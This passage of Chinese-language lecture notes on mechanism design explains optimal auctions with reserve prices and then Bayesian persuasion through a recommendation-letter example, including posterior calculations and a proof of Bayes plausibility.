<li>这显然是 <span class="arithmatex">\(Q_i\)</span> 关于 <span class="arithmatex">\(t_i\)</span> 单调递增的充分条件，因为如果 <span class="arithmatex">\(c_i(t_i)\)</span> 关于 <span class="arithmatex">\(t_i\)</span> 单调递增，那么根据之前 <span class="arithmatex">\(x_i\)</span> 的选择，当参与人 <span class="arithmatex">\(i\)</span> 提高报价时，他得到物品的概率不会降低，从而 <span class="arithmatex">\(Q_i\)</span> 关于 <span class="arithmatex">\(t_i\)</span> 单调递增也成立；</li>
</ul>
<p><strong>因此当满足正则化条件时，上面给出的解的确是合理的最优机制</strong>。</p>
</div>
<p>现在继续考虑正则化条件满足的情况。已有正则化条件下的最优机制的分配规则 <span class="arithmatex">\(x\)</span>，接下来需要确定支付规则 <span class="arithmatex">\(p\)</span>。不难理解分配规则仍然是一个阶梯函数，令</p>
<div class="arithmatex">\[
z_i(t_{-i}) = \inf\{s_i \mid c_i(s_i) \geq 0 \text{ 且 } c_i(s_i) \geq c_j(t_j), \forall j \neq i\}
\]</div>
<p>即 <span class="arithmatex">\(z_i(t_{-i})\)</span> 是使得参与人 <span class="arithmatex">\(i\)</span> 刚好能有机会获得物品的最低报价，也就是所谓阶梯函数的间断点。那么根据支付公式</p>
<div class="arithmatex">\[
p_i(b, t_{-i}) = b \cdot x_i(b, t_{-i}) - \int_{a_i}^b x_i(s, t_{-i})ds
\]</div>
<p>可以解出分配规则对应的支付规则 <span class="arithmatex">\(p\)</span> 为</p>
<div class="arithmatex">\[
p_i(t) = \begin{cases}
z_i(t_{-i}) x_i(t), &amp; c_i(z_i(t_{-i})) \geq t_0 \text{ 且 } c_i(z_i(t_{-i})) \geq c_j(t_j), \forall j \neq i \\
0, &amp; \text{其他情况}
\end{cases}
\]</div>
<p>更简单的，如果只有一个满足 <span class="arithmatex">\(c_i(z_i(t_{-i})) \geq t_0\)</span> 和 <span class="arithmatex">\(c_i(z_i(t_{-i})) \geq c_j(t_j), \forall j \neq i\)</span> 的 <span class="arithmatex">\(i\)</span>，则 <span class="arithmatex">\(x_i(t) = 1\)</span>，且</p>
<div class="arithmatex">\[
p_i(t) = \begin{cases}
z_i(t_{-i}), &amp; x_i(t) = 1 \\
0, &amp; x_i(t) = 0.
\end{cases}
\]</div>
<div class="admonition example">
<p class="admonition-title">Example</p>
<p>考虑一种最简单的情况来具象化前面给出的结论。考虑一个所有买家估值独立同分布的情形（即对称模型），并且符合正则化条件，得到</p>
<div class="arithmatex">\[
z_i(t_{-i}) = \max\left\{c^{-1}(t_0), \max_{j \neq i} t_j\right\}.
\]</div>
<ul>
<li>
<p>结合前面得到的 <span class="arithmatex">\((x,p)\)</span>，此时的最优机制其实就是一个 <strong>含保留价格的二价拍卖机制</strong>；</p>
</li>
<li>
<p>在对称情况下所有买家估值同分布情形下，卖家对每位买家的虚拟估值函数相同，故具有最高估值（即最高报价）的赢得物品，并且支付第二高报价和保留价格之间的较高者，并且如果最高报价低于保留价格，则不分配物品。</p>
</li>
</ul>
<p><strong>更具体而言</strong>，当所有买家估值独立且取从 <span class="arithmatex">\([0,1]\)</span> 上的均匀分布时，虚拟估值函数为 <span class="arithmatex">\(c_i(t_i) = 2t_i - 1\)</span>。因此保留价格为 <span class="arithmatex">\(1/2\)</span>。此时的最优机制就是 <strong>保留价格为 <span class="arithmatex">\(1/2\)</span> 的第二价格拍卖</strong>。</p>
<p><figure markdown>
<img alt="对称模型下的最优机制" src="../NOTE/DataMarket/img/optex.png" />
</figure></p>
</div>
<div class="admonition summary">
<p class="admonition-title">Summary</p>
<ul>
<li>满足正则化条件，分配给虚拟估值最高的买家，且估值不小于0；</li>
<li>如果卖出，支付为第二高报价和保留价格之间的较高者；</li>
</ul>
<p>尽管最优机制可以使得卖家获得最大的期望效用，但是这一机制存在一些天然的缺陷：</p>
<ol>
<li>
<p><strong>卖家很难准确估计每一个买家的估值分布</strong>，因此这一机制很难完美实现，特别是应用于数据拍卖场景时，数据买家的估值不确定性更大，因此之后会讨论在无先验分布下的机制设计；</p>
</li>
<li>
<p><strong>非对称模型（即买家的估值不同分布）下，报价最高的买家可能并不是最有可能获得物品的买家</strong>。这一点显然，因为不同的分布下虚拟估值会有所不同(收入等价原理为报价高的买家获得物品，所以不一定满足收入等价原理)：</p>
<ul>
<li>
<p>若 <span class="arithmatex">\(f_i(t_i) = \frac{1}{b_i-a_i}\)</span>，即买家的估值均匀分布，不难计算得到 <span class="arithmatex">\(c_i(t_i) = 2t_i - b_i\)</span>。这关于 <span class="arithmatex">\(t_i\)</span> 是单调递增的，因此符合正则化条件；</p>
</li>
<li>
<p>但是此时的最优机制是选出 <span class="arithmatex">\(2t_i - b_i\)</span> 最大的 <span class="arithmatex">\(i\)</span>，如果 <span class="arithmatex">\(b_i &lt; b_j\)</span>，那么可能存在 <span class="arithmatex">\(t_i &lt; t_j\)</span> 但是 <span class="arithmatex">\(2t_i - b_i &gt; 2t_j - b_j\)</span> 的情况，即报价更低的买家可能获得物品；</p>
</li>
</ul>
</li>
<li>
<p><strong>最优机制不是事后有效率的</strong>。例如我们考虑对称模型下，卖家估值等于 0 且买家估值都大于 0 的情况，此时显然物品要售出才是帕累托最大化（也是俗称的最优事后有效率）的，但是如果所有买家的报价都低于 <span class="arithmatex">\(c_i^{-1}(0)\)</span>，那么物品就不会被售出，这显然不是事后有效率的。</p>
</li>
</ol>
</div></section><section class="print-page" id="note-datamarket-beyesian" heading-number="2.2.5.7"><h1 id="note-datamarket-beyesian-_1">贝叶斯劝说<a class="headerlink" href="#note-datamarket-beyesian-_1" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 5579 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 17H7V3h14m0-2H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2M3 5H1v16a2 2 0 0 0 2 2h16v-2H3m12.96-10.71-2.75 3.54-1.96-2.36L8.5 15h11z"/></svg></span> 2 张图片 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 19 分钟</p>
</div>
<h2 id="note-datamarket-beyesian-_2">背景与例子<a class="headerlink" href="#note-datamarket-beyesian-_2" title="Permanent link">&para;</a></h2>
<p>考虑导师写推荐信将学生推荐至企业的例子：</p>
<h3 id="note-datamarket-beyesian-_3">参与者设定<a class="headerlink" href="#note-datamarket-beyesian-_3" title="Permanent link">&para;</a></h3>
<ul>
<li>
<p><strong>两个参与人：</strong></p>
<ul>
<li><strong>导师（信号发送者）</strong></li>
<li><strong>企业（信号接收者）</strong></li>
</ul>
</li>
<li>
<p><strong>导师的任务：</strong> 是向企业为每位学生写推荐信，通过推荐信的好坏向企业发送信号</p>
</li>
<li><strong>企业的任务：</strong> 是对一个学生，在接收到导师的推荐信（信号）后必须做出以下两种决策之一：<ul>
<li><strong>雇用（hiring）</strong></li>
<li><strong>不雇用（not hiring）</strong></li>
</ul>
</li>
<li><strong>学生不是博弈参与方：</strong> 因为学生只被动接受结果，没有自己的策略</li>
</ul>
<h3 id="note-datamarket-beyesian-_4">学生类型<a class="headerlink" href="#note-datamarket-beyesian-_4" title="Permanent link">&para;</a></h3>
<ul>
<li>
<p><strong>学生有两种类型：</strong></p>
<ul>
<li><strong>优秀（excellent）</strong></li>
<li><strong>一般（average）</strong></li>
</ul>
</li>
<li>
<p><strong>学生的类型对导师而言是已知的，对企业则是不完全信息</strong></p>
</li>
<li><strong>与不完全信息博弈中的假设一致：</strong> 可以认为学生的类型是自然按一定的先验概率随机抽取的</li>
</ul>
<h3 id="note-datamarket-beyesian-_5">先验分布<a class="headerlink" href="#note-datamarket-beyesian-_5" title="Permanent link">&para;</a></h3>
<ul>
<li>
<p><strong>企业对学生类型有先验分布：</strong></p>
<ul>
<li><span class="arithmatex">\(\mu_0\)</span>(average) = 0.75</li>
<li><span class="arithmatex">\(\mu_0\)</span>(excellent) = 0.25</li>
</ul>
</li>
<li>
<p><strong>这一先验概率分布也符合导师已知的实际学生类型分布</strong></p>
</li>
<li><strong>因此如果随机抽取一个学生，则企业和导师对学生类型有共同的先验分布</strong></li>
</ul>
<h3 id="note-datamarket-beyesian-_6">效用函数定义<a class="headerlink" href="#note-datamarket-beyesian-_6" title="Permanent link">&para;</a></h3>
<ul>
<li><strong>导师的效用函数：</strong></li>
<li>
<p>假设导师希望推荐出去的学生越多越好，因此企业只要雇用一个学生，则导师获得效用1，否则效用为0</p>
</li>
<li>
<p><strong>企业的效用函数：</strong></p>
</li>
<li>企业则希望招收到优秀的学生，因此在招收到优秀的学生时获得效用为1，招收普通学生时获得效用为-0.5</li>
</ul>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>综上所述，目前定义了：</p>
<ul>
<li><strong>两个参与人</strong></li>
<li><strong>企业的策略</strong></li>
<li><strong>两个参与人的效用函数</strong></li>
<li><strong>不完全信息的先验分布</strong></li>
</ul>
<p>因此接下来需要形式化定义导师的策略，即形式化"发信号"这一策略。</p>
<p>形式地说，发信号就是通过好或坏的推荐信来向企业表明学生是优秀的或一般的。形式化地说，导师写推荐信的策略就是如下两个条件概率分布 <span class="arithmatex">\(\pi(\cdot | \text{excellent})\)</span> 和 <span class="arithmatex">\(\pi(\cdot | \text{average})\)</span>（又称信号机制（signaling scheme））：</p>
<ul>
<li><span class="arithmatex">\(\pi(e | \text{excellent}), \pi(a | \text{excellent})\)</span></li>
<li><span class="arithmatex">\(\pi(e | \text{average}), \pi(a | \text{average})\)</span></li>
</ul>
<p>其中 <span class="arithmatex">\(e\)</span> 和 <span class="arithmatex">\(a\)</span> 分别表示描述学生为优秀类型和一般类型的推荐信；
- <span class="arithmatex">\(\pi(A | B)\)</span> 表示当学生属于 <span class="arithmatex">\(B\)</span> 类型时，导师在推荐信中给学生描述的类型为 <span class="arithmatex">\(A\)</span> 的概率；
- 例如 <span class="arithmatex">\(\pi(e | \text{average})\)</span> 表示学生一般时导师在推荐信中将其描述为优秀学生的概率。</p>
</div>
<div class="admonition tip">
<p class="admonition-title">Tip</p>
<p>导师和企业之间存在长期关系，因此导师的策略是企业在看到推荐信之前就已知的，因为企业在与导师的长期关系中可以验证导师的策略。</p>
</div>
<div class="admonition example">
<p class="admonition-title">Example</p>
<p>第一个信号的例子是，导师完全诚实地推荐学生，即为优秀的学生写好的推荐信，为一般的学生写一般的推荐信，故此时信号机制为</p>
<ul>
<li><span class="arithmatex">\(\pi(e | \text{excellent}) = 1, \pi(a | \text{excellent}) = 0;\)</span></li>
<li>
<p><span class="arithmatex">\(\pi(e | \text{average}) = 0, \pi(a | \text{average}) = 1.\)</span></p>
</li>
<li>
<p>企业知道导师的推荐信是诚实的，因此将接收所有推荐信中写优秀的学生，拒绝所有推荐信中写一般的学生：</p>
<ul>
<li>此时导师期望的同学雇出，故在每个学生上的期望效用为0.25；</li>
<li>企业接收所有优秀同学，故在每个学生上的期望效用为0.25。</li>
</ul>
</li>
</ul>
<p>第二个例子是导师总是推荐学生为优秀，即</p>
<ul>
<li><span class="arithmatex">\(\pi(e | \text{excellent}) = 1, \pi(a | \text{excellent}) = 0;\)</span></li>
<li>
<p><span class="arithmatex">\(\pi(e | \text{average}) = 1, \pi(a | \text{average}) = 0.\)</span></p>
</li>
<li>
<p>因此此时企业看到的全是好的推荐信，因此只能保持先验概率去判断学生的好坏：</p>
<ul>
<li>由于每个学生是优秀类型的概率只有 0.25，因此如果企业雇用任意一个学生，其期望效用为 <span class="arithmatex">\(0.25 \times 1 - 0.75 \times 0.5 = -0.125\)</span>，因此企业不会雇用任何一个学生；</li>
<li>此时导师和企业的期望效用均为 0。</li>
</ul>
</li>
</ul>
<p>最优情况(导师效用最大化)为</p>
<p>最优情况为导师在推荐信中对优秀学生诚实，而对一般学生有一定的美化，即信号机制为：</p>
<ul>
<li><span class="arithmatex">\(\pi(e | \text{excellent}) = 1, \pi(a | \text{excellent}) = 0;\)</span></li>
<li><span class="arithmatex">\(\pi(e | \text{average}) = \frac{2}{3}, \pi(a | \text{average}) = \frac{1}{3}.\)</span></li>
</ul>
<div class="admonition info">
<p class="admonition-title">贝叶斯公式</p>
<div class="arithmatex">\[
P(A | B) = \frac{P(B | A)P(A)}{\sum_{x \in X} P(B | x)P(x)}
\]</div>
</div>
<p>通过贝叶斯公式可以计算出企业看到推荐信后对学生的后验概率分布<span class="arithmatex">\(\mu_A(B)\)</span>,即看到类型<span class="arithmatex">\(A\)</span>的推荐信后，认为学生是类型<span class="arithmatex">\(B\)</span>的概率。 <br />
也就是<span class="arithmatex">\(\mu(B | A)\)</span></p>
<p>所以</p>
<div class="arithmatex">\[
    \mu_e(excellent) = \dfrac{\pi(e | \text{excellent}) \mu_0(excellent)}{\pi(e | \text{excellent}) \mu_0(excellent) + \pi(e | \text{average}) \mu_0(average)} = \dfrac{1}{3}
\]</div>
<div class="arithmatex">\[
    \mu_e(average) = 1-\mu_e(excellent) = \dfrac{2}{3}
\]</div>
<div class="arithmatex">\[
    \mu_a(average) = \dfrac{\pi(a | \text{average}) \mu_0(average)}{\pi(a | \text{average}) \mu_0(average) + \pi(a | \text{excellent}) \mu_0(excellent)} = 1
\]</div>
<div class="arithmatex">\[
    \mu_a(excellent) = 1-\mu_a(average) = 0
\]</div>
<p>还可以计算出企业看到好的推荐信和一般的推荐信的概率</p>
<div class="arithmatex">\[
    P(e) = \pi(e | \text{excellent}) \mu_0(excellent) + \pi(e | \text{average}) \mu_0(average) = 0.75
\]</div>
<div class="arithmatex">\[
    P(a) = \pi(a | \text{excellent}) \mu_0(excellent) + \pi(a | \text{average}) \mu_0(average) = 0.25
\]</div>
<p>在这种情况下，当企业看到好的推荐信时，对学生的后验分布更新为<span class="arithmatex">\(1/3\)</span>的概率是好学生，此时它的期望效用为</p>
<div class="arithmatex">\[
    \frac{1}{3} \times 1 + \frac{2}{3} \times -0.5 = 0
\]</div>
<p>与不雇佣期望效用一样，但是企业在这种情况下会选择雇佣，<em>假设在信号接收者策略无差异的情况下，信号接收者会选择有利于信
号发送者的决策</em></p>
<p>当企业看到一般的推荐信时，对学生的后验分布更新为<span class="arithmatex">\(1\)</span>的概率是不好学生，此时它的期望效用为0，选择不雇佣</p>
<p>综合来说，企业的期望效用是0；</p>
<p>对于导师而言，由于企业采取的策略是雇佣所有好的推荐信，不雇佣所有的一般推荐信，因此导师的期望效用为所有的好学生和<span class="arithmatex">\(2/3\)</span>的一般学生的期望效用之和，即</p>
<div class="arithmatex">\[
    0.25 \times 1 + \frac{2}{3} \times 0.75 = 0.75
\]</div>
<p>或者还有一种计算方法，只要给出了好的推荐信，效用就是1，所以</p>
<div class="arithmatex">\[
    1*P(e) + 0*P(a) = 0.75
\]</div>
</div>
<h2 id="note-datamarket-beyesian-_7">贝叶斯劝说<a class="headerlink" href="#note-datamarket-beyesian-_7" title="Permanent link">&para;</a></h2>
<h3 id="note-datamarket-beyesian-_8">一般化的贝叶斯劝说模型<a class="headerlink" href="#note-datamarket-beyesian-_8" title="Permanent link">&para;</a></h3>
<p>从导师写推荐信的例子中可以提炼出一般的贝叶斯劝说（<strong>Bayesian persuasion</strong> ）模型：</p>
<ul>
<li>
<p><strong>两个参与人：</strong> 信号发送者（导师）和信号接收者（企业）；</p>
</li>
<li>
<p><strong>他们对自然的真实状态</strong> <span class="arithmatex">\(\omega \in \Omega\)</span>（一个学生优秀/一般）<strong>有相同的先验分布</strong> <span class="arithmatex">\(\mu_0 \in \text{int}(\Delta(\Omega))\)</span>，<strong>信号发送者知道状态的实现值</strong>（即具体每个学生是优秀还是一般的），<strong>但信号接收者不知道：</strong></p>
</li>
<li><span class="arithmatex">\(\Delta(\Omega)\)</span> 表示 <span class="arithmatex">\(\Omega\)</span> 上的概率分布；</li>
<li>
<p><span class="arithmatex">\(\text{int}\)</span> 含义是内点，即先验分布保证每个状态的概率都是正的；</p>
</li>
<li>
<p><strong>假定双方都是理性的，即追求效用最大化的，并且都是按照贝叶斯公式更新信念的；</strong></p>
</li>
<li>
<p><strong>发送者的效用为</strong> <span class="arithmatex">\(v(a,\omega)\)</span>，<strong>接收者的效用为</strong> <span class="arithmatex">\(u(a,\omega)\)</span>：</p>
</li>
<li>导师的效用为 <span class="arithmatex">\(v(\text{hiring}, \omega) = 1, v(\text{not hiring}, \omega) = 0\)</span>（与 <span class="arithmatex">\(\omega\)</span> 无关）；</li>
<li>企业的效用为 <span class="arithmatex">\(u(\text{hiring}, \text{average}) = -0.5\)</span> 等。</li>
</ul>
<h3 id="note-datamarket-beyesian-_9">博弈的行动顺序<a class="headerlink" href="#note-datamarket-beyesian-_9" title="Permanent link">&para;</a></h3>
<p>博弈的行动顺序如下（<strong>动态博弈需要说明顺序</strong>）：</p>
<ol>
<li>
<p><strong>发送者公开（承诺（commit））信号机制</strong> <span class="arithmatex">\((S, \pi(s | \omega)), \forall s \in S, \omega \in \Omega\)</span>：</p>
<ul>
<li><span class="arithmatex">\(S\)</span> 称为信号实现空间，例如前面的例子中 <span class="arithmatex">\(S = \{e, a\}\)</span>；</li>
<li>故信号机制包含信号实现空间 <span class="arithmatex">\(S\)</span> 及其在所有现实状态下的条件分布；</li>
<li>于是接收者可以利用贝叶斯公式计算出后验概率 <span class="arithmatex">\(\mu_s(\omega)\)</span>；</li>
</ul>
</li>
<li>
<p><strong>自然以分布</strong> <span class="arithmatex">\(\mu_0\)</span> <strong>选择</strong> <span class="arithmatex">\(\omega \in \Omega\)</span>（抽出一个学生是优秀/一般的）；</p>
</li>
<li>
<p><strong>类型为</strong> <span class="arithmatex">\(\omega\)</span> <strong>时发送者以概率</strong> <span class="arithmatex">\(\pi(s | \omega)\)</span> <strong>发送信号</strong> <span class="arithmatex">\(s \in S\)</span>；</p>
</li>
<li>
<p><strong>接收者收到信号</strong> <span class="arithmatex">\(s\)</span> <strong>并选择一个行动</strong> <span class="arithmatex">\(a \in A\)</span>（企业雇用/不雇用学生）：</p>
</li>
<li>
<p><span class="arithmatex">\(a\)</span> 的选择应当最大化接收者的效用，即挑选一个行动使得在这个后验概率分布下期望效用最大，例如企业在看到优秀的推荐信后，选择雇佣学生</p>
<div class="arithmatex">\[
    a = \arg \max_{a \in A} \mathbb{E}_{\mu_s}[u(a, w)]
\]</div>
</li>
</ol>
<p>如果有多个最大化效用的选择，假设其选择最大化发送者效用的行动（企业雇用和不雇用无差异时，选择雇用学生）。</p>
<ol>
<li><strong>发送者获得效用</strong> <span class="arithmatex">\(v(a, \omega)\)</span>，<strong>接收者获得效用</strong> <span class="arithmatex">\(u(a, \omega)\)</span>。</li>
</ol>
<div class="admonition info">
<p class="admonition-title">Info</p>
<p>注意贝叶斯劝说的第一步就是信号发送者公开承诺信号机制：
    - 回忆导师写推荐信的例子，这样的情况可以发生在结果可验证的情况；
    - 例如企业可以在雇用后看出学生的能力，或者消费者在购买后能够判断产品的真实价值；
    - 因此贝叶斯劝说在这些场景下尤为重要；</p>
<p>此外，贝叶斯劝说模型中，信号发送者优先行动，接收者在看到信号发
送者的行动后行动，故最优化问题实际是一个双层优化问题；</p>
<p>此时信号发送者和信号接收者的策略相对于对方的策略都是最优的，并且信号接收者的信念通过贝叶斯公式进行了更新，这一均衡被称为完美贝叶斯均衡（perfect Bayesian equilibrium）。</p>
</div>
<hr />
<p>贝叶斯劝说主要希望研究以下三个问题</p>
<ol>
<li>
<p>发送者是否总是可以通过设计信号机制来影响接收者的行为，从而提升
自己的效用？如果不是，什么情况下可以？</p>
</li>
<li>
<p>发送者如何设计信号机制以达到最大化自己的效用？最大化效用时信号
以及接收者的行为的特点是什么样的？</p>
</li>
<li>
<p>接收者是否愿意接受发送者的信号机制？如果不是，什么情况下可以？</p>
</li>
</ol>
<hr />
<h3 id="note-datamarket-beyesian-_10">贝叶斯可行<a class="headerlink" href="#note-datamarket-beyesian-_10" title="Permanent link">&para;</a></h3>
<p>为了解决前两个问题，首先要定义贝叶斯可行（<strong>Bayesian plausible</strong>）的概念，然后将设计最优信号机制的问题转化为更容易解决的问题。</p>
<h4 id="note-datamarket-beyesian-_11">后验概率分布的性质<a class="headerlink" href="#note-datamarket-beyesian-_11" title="Permanent link">&para;</a></h4>
<p>给定信号机制 <span class="arithmatex">\((S, \pi(s | \omega))\)</span>，任一信号实现 <span class="arithmatex">\(s\)</span> 都会导致一个后验概率分布 <span class="arithmatex">\(\mu_s \in \Delta(\Omega)\)</span>，即对任意的 <span class="arithmatex">\(s \in S, \omega \in \Omega\)</span>：</p>
<div class="arithmatex">\[
\mu_s(\omega) = \frac{\pi(s | \omega)\mu_0(\omega)}{\sum_{\omega' \in \Omega} \pi(s | \omega')\mu_0(\omega')}
\]</div>
<p>由于每个 <span class="arithmatex">\(s\)</span> 都会导致一个后验概率分布，所以所有的 <span class="arithmatex">\(s\)</span> 将导致 <span class="arithmatex">\(|S|\)</span> 个后验概率分布，并且所有的后验概率分布本质上都是 <span class="arithmatex">\(\Omega\)</span> 上的分布。根据全概率公式，每个 <span class="arithmatex">\(s\)</span> 被发出的概率为：</p>
<div class="arithmatex">\[
\mathbb{P}(s) = \sum_{\omega' \in \Omega} \pi(s | \omega')\mu_0(\omega')
\]</div>
<p>所有 <span class="arithmatex">\(s\)</span> 将导致一个后验概率分布的分布 <span class="arithmatex">\(\tau \in \Delta(\Delta(\Omega))\)</span>，其中概率分布支撑为 <span class="arithmatex">\(\text{Supp}(\tau) = \{\mu_s\}_{s \in S}\)</span>，支撑中每一个后验概率 <span class="arithmatex">\(\mu \in \Delta(\Omega)\)</span> 的概率为：</p>
<div class="arithmatex">\[
\tau(\mu) = \sum_{s:\mu_s=\mu} \mathbb{P}(s) = \sum_{s:\mu_s=\mu} \sum_{\omega' \in \Omega} \pi(s | \omega')\mu_0(\omega')
\]</div>
<p>如果每个后验概率都不同，则支撑中每一个后验概率 <span class="arithmatex">\(\mu \in \Delta(\Omega)\)</span> 的概率为：</p>
<div class="arithmatex">\[
\tau(\mu) = \mathbb{P}(s) = \sum_{\omega' \in \Omega} \pi(s | \omega')\mu_0(\omega')
\]</div>
<div class="admonition eaxmple">
<p class="admonition-title">Eaxmple</p>
<p>例如，回忆导师写推荐信的例子，在最优机制下，信号机制导致的两个后验概率分布分别为：</p>
<div class="arithmatex">\[
   \mu_e(\text{excellent}) = 1/3, \mu_e(\text{average}) = 2/3
\]</div>
<p>和</p>
<div class="arithmatex">\[
   \mu_a(\text{excellent}) = 0, \mu_a(\text{average}) = 1
\]</div>
<p>这两个后验概率分布不相同，因此 <span class="arithmatex">\(\text{Supp}(\tau) = \{\mu_e, \mu_a\}\)</span>，二者概率为：</p>
<div class="arithmatex">\[
   \mathbb{P}(e) = \pi(e | \text{excellent})\mu_0(\text{excellent}) + \pi(e | \text{average})\mu_0(\text{average}) = 0.75
\]</div>
<div class="arithmatex">\[
   \mathbb{P}(a) = \pi(a | \text{excellent})\mu_0(\text{excellent}) + \pi(a | \text{average})\mu_0(\text{average}) = 0.25
\]</div>
<p>在这里，后验分布指的是知道信号后，对学生类型的判断(<span class="arithmatex">\(\mu_e, \mu_a\)</span>是学生类型的分布)。后验分布的分布指的是接收到不同信号的分布(<span class="arithmatex">\(\tau\)</span>是<span class="arithmatex">\(\mu_e, \mu_a\)</span>的分布,即满足某一分布的概率是什么)。</p>
</div>
<h4 id="note-datamarket-beyesian-_12">贝叶斯可行的定义<a class="headerlink" href="#note-datamarket-beyesian-_12" title="Permanent link">&para;</a></h4>
<p>基于上述记号，可以给出贝叶斯可行的定义：</p>
<div class="admonition definition">
<p class="admonition-title">Definition</p>
<p>称 <span class="arithmatex">\(\tau\)</span> 由信号导致，如果存在信号机制 <span class="arithmatex">\((S, \pi(s | \omega))\)</span> 对应的后验概率分布的分布为 <span class="arithmatex">\(\tau\)</span>。称一个后验概率分布的分布 <span class="arithmatex">\(\tau\)</span> 是贝叶斯可行的，如果</p>
<div class="arithmatex">\[
\sum_{\text{Supp}(\tau)} \mu\tau(\mu) = \mu_0
\]</div>
<p>即后验概率的期望等于先验概率。</p>
</div>
<div class="admonition example">
<p class="admonition-title">Example</p>
<p>这里不同的后验概率分布可以求和的原因在于，本质上不同的后验概率分布都是 <span class="arithmatex">\(\Omega\)</span> 上的概率分布。例如可以检查导师写推荐信的例子是否满足贝叶斯可行性：</p>
<p>原先验概率分布为<span class="arithmatex">\(\mu_0 = (\mu_0(\text{excellent}), \mu_0(\text{average})) = (0.25, 0.75)\)</span>，后验概率分布为<span class="arithmatex">\(\mu_e = (1/3, 2/3)\)</span>和<span class="arithmatex">\(\mu_a = (0, 1)\)</span>，后验概率分布的分布为<span class="arithmatex">\(\tau = (\tau(\mu_e), \tau(\mu_a)) = (0.75, 0.25)\)</span>。</p>
<p>因此有</p>
<div class="arithmatex">\[
    \mathbb{E}_{\tau}[\mu] = 0.75 \mu_e + 0.25 \mu_a = 0.75 \times (1/3, 2/3) + 0.25 \times (0, 1) = (0.25, 0.75) = \mu_0
\]</div>
<p>因此，导师写推荐信的例子中的信号机制是贝叶斯可行的。</p>
</div>
<p>下面这个定理给出了信号机制导致和贝叶斯可行之间的联系</p>
<div class="admonition theorem">
<p class="admonition-title">Theorem</p>
<p>一个后验概率分布的分布 <span class="arithmatex">\(\tau \in \Delta(\Delta(\Omega))\)</span> 是贝叶斯可行的当且仅当存在一个信号机制 <span class="arithmatex">\((S, \pi(s | \omega))\)</span> 使得 <span class="arithmatex">\(\tau\)</span> 是由该信号机制导致的。</p>
<p>即对该后验分布的分布求期望分布，该期望分布等于先验分布。</p>
<div class="admonition success">
<p class="admonition-title">证明</p>
<p>首先证明信号机制推出贝叶斯可行性</p>
<div class="arithmatex">\[
\begin{align*}
\sum_{\text{Supp}(\tau)} \mu(\omega)\tau(\mu) &amp;= \sum_{s \in S} \mu_s(\omega)\mathbb{P}(s) \\
&amp;= \sum_{s \in S} \frac{\pi(s \mid \omega)\mu_0(\omega)}{\sum_{\omega' \in \Omega} \pi(s \mid \omega')\mu_0(\omega')}\mathbb{P}(s) \\
&amp;= \sum_{s \in S} \pi(s \mid \omega)\mu_0(\omega) = \mu_0(\omega)
\end{align*}
\]</div>
<p>接下来，由贝叶斯可行性，我们可以构造一个信号机制 <span class="arithmatex">\((S, \pi(s | \omega))\)</span> </p>
<p>由</p>
<div class="arithmatex">\[
    \mu_s(\omega) = \frac{\pi(s | \omega)\mu_0(\omega)}{\mathbb{P}(s)}
\]</div>
<p>可以得到</p>
<div class="arithmatex">\[
    \pi(s | \omega) = \frac{\mathbb{P}(s)\mu_s(\omega)}{\mu_0(\omega)} = \frac{\tau(\mu_s)\mu_s(\omega)}{\mu_0(\omega)}
\]</div>
<p>接下来验证对于所有的<span class="arithmatex">\(s\)</span>求和等于1即可</p>
<div class="arithmatex">\[
    \sum_{s \in S} \pi(s | \omega) = \sum_{s \in S} \frac{\tau(\mu_s)\mu_s(\omega)}{\mu_0(\omega)} = \frac{\sum_{s \in S} \tau(\mu_s)\mu_s(\omega)}{\mu_0(\omega)} = \frac{\mu_0(\omega)}{\mu_0(\omega)} = 1
\]</div>
<p>最后一步是由于<span class="arithmatex">\(\sum_{\text{Supp}(\tau)} \mu\tau(\mu) = \mu_0\)</span>。这是贝叶斯可行的定义。</p>
</div>
</div>
<div class="admonition summary">
<p class="admonition-title">Summary</p>
<p>因此，一个信号机制等价于一个贝叶斯可行的后验概率分布的分布；</p>
<ul>
<li>
<p>进而可以导致接收者行动的分布，因为一个后验概率分布就对应接收者的一个最优行动；</p>
</li>
<li>
<p>显然，只要接收者行动分布一定，那么发送者的效用也是确定的；</p>
</li>
<li>因此是否存在一个信号机制使得发送者达到效用 <span class="arithmatex">\(v^*\)</span>，只需要考虑是否存在一个贝叶斯可行的后验概率分布的分布 <span class="arithmatex">\(\tau\)</span> 使得发送者效用达到 <span class="arithmatex">\(v^*\)</span>；</li>
<li>因此设计最优信号机制的问题可以转化为设计一个贝叶斯可行的后验概率分布的分布 <span class="arithmatex">\(\tau\)</span> </li>
</ul>
</div>
<h2 id="note-datamarket-beyesian-_13">最优机制问题<a class="headerlink" href="#note-datamarket-beyesian-_13" title="Permanent link">&para;</a></h2>
<h3 id="note-datamarket-beyesian-_14">问题转化<a class="headerlink" href="#note-datamarket-beyesian-_14" title="Permanent link">&para;</a></h3>
<p>问题转化后，我们需要解决的问题是设计一个贝叶斯可行的后验概率分布的分布 <span class="arithmatex">\(\tau\)</span> 使得发送者的效用最大化。首先将问题形式化：记后验概率为 <span class="arithmatex">\(\mu\)</span> 时，接收者的最优行动为 <span class="arithmatex">\(\hat{a}(\mu)\)</span>，则发送者的期望效用为：</p>
<div class="arithmatex">\[
\hat{v}(\mu) = \mathbb{E}_{\mu} v(\hat{a}(\mu), \omega)
\]</div>
